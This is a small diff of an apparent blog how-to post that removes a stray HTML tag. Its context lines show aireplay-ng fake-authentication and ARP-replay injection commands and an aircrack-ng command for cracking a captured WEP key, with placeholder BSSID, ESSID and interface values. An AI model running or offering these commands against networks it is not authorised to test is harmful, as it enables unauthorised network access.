@@ -16,7 +16,7 @@ categories: [how to, networking, ubuntu, ubuntu]
 <pre>aireplay-ng -1 0 -a (bssid) -h 00:11:22:33:44:55 -e (essid) (interface) aireplay-ng -3 -b (bssid) -h 00:11:22:33:44:55 (interface)</pre>
 
 <strong>CRACK A LACKIN'</strong>
-<pre>aircrack-ng -b (bssid) (file name-01.cap)</em></pre>
+<pre>aircrack-ng -b (bssid) (file name-01.cap)</pre>
 
 
 cheers.
